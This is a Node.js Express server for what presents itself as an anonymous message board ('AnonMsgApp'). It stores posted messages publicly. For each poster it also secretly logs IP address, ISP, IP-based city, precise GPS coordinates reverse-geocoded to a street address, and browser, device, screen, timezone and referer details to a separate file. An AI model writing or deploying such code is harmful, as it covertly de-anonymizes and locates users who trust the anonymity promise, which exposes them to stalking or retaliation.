const express = require('express');
const fs = require('fs');
const path = require('path');
const https = require('https');
const app = express();
const PORT = process.env.PORT || 3000;

const DATA_FILE = path.join(__dirname, 'mensagens.json');
const USER_DATA_FILE = path.join(__dirname, 'userData.json');

app.use(express.json());
app.use(express.static('public'));

function reverseGeocode(lat, lon) {
  return new Promise((resolve) => {
    const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`;
    const options = {
      headers: {
        'User-Agent': 'AnonMsgApp/1.0'
      }
    };
    https.get(url, options, res => {
      let data = '';
      res.on('data', chunk => (data += chunk));
      res.on('end', () => {
        try {
          const json = JSON.parse(data);
          resolve(json.display_name || 'Endereço não identificado');
        } catch {
          resolve('Erro ao decodificar endereço');
        }
      });
    }).on('error', () => {
      resolve('Erro ao acessar OpenStreetMap');
    });
  });
}

app.get('/mensagens', (req, res) => {
  fs.readFile(DATA_FILE, 'utf8', (err, data) => {
    let mensagens = [];
    try {
      mensagens = JSON.parse(data || '[]');
    } catch {
      mensagens = [];
    }
    res.send(mensagens);
  });
});

app.post('/mensagem', async (req, res) => {
  const id = Date.now();
  const novaMensagem = {
    id,
    texto: req.body.texto.slice(0, 280),
    data: new Date().toISOString()
  };

  const userMeta = req.body.userData || {};
  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').replace('::ffff:', '');
  let geo = {};

  try {
    const resp = await fetch(`http://ip-api.com/json/${ip}`);
    geo = await resp.json();
  } catch {
    geo = { status: 'fail' };
  }

  let endereco = null;
  if (userMeta.latitude && userMeta.longitude) {
    endereco = await reverseGeocode(userMeta.latitude, userMeta.longitude);
  }

  let nivelPrecisao = 'indefinido';
  const acc = userMeta.accuracy;
  if (acc <= 50) nivelPrecisao = 'alta';
  else if (acc <= 1000) nivelPrecisao = 'media';
  else if (acc > 1000) nivelPrecisao = 'baixa';

  const userInfo = {
    id,
    ip,
    location: geo.status !== 'fail' ? `${geo.country} - ${geo.city}` : 'Desconhecido',
    isp: geo.isp || 'N/A',
    latitude: userMeta.latitude || geo.lat || null,
    longitude: userMeta.longitude || geo.lon || null,
    accuracy: acc || null,
    precisao: nivelPrecisao,
    address: endereco || 'Não disponível',
    browser: userMeta.browser || 'Desconhecido',
    os: userMeta.os || 'Desconhecido',
    device: userMeta.device || 'Desconhecido',
    userAgent: req.headers['user-agent'] || 'N/A',
    timezone: userMeta.timezone || 'Desconhecido',
    language: userMeta.language || 'Desconhecido',
    screen: userMeta.screen || 'Desconhecido',
    referer: req.headers['referer'] || 'acesso direto',
    date: new Date().toISOString()
  };

  fs.readFile(DATA_FILE, 'utf8', (err, data) => {
    let mensagens = [];
    try {
      mensagens = JSON.parse(data || '[]');
    } catch {
      mensagens = [];
    }
    mensagens.push(novaMensagem);
    fs.writeFile(DATA_FILE, JSON.stringify(mensagens, null, 2), err => {
      if (err) console.error('Erro ao salvar mensagens:', err);
    });
  });

  fs.readFile(USER_DATA_FILE, 'utf8', (err, data) => {
    let usuarios = [];
    try {
      usuarios = JSON.parse(data || '[]');
    } catch {
      usuarios = [];
    }
    usuarios.push(userInfo);
    fs.writeFile(USER_DATA_FILE, JSON.stringify(usuarios, null, 2), err => {
      if (err) console.error('Erro ao salvar userData:', err);
    });
  });

  res.status(201).send(novaMensagem);
});

app.listen(PORT, () => {
  console.log(`Servidor rodando em http://localhost:${PORT}`);
});
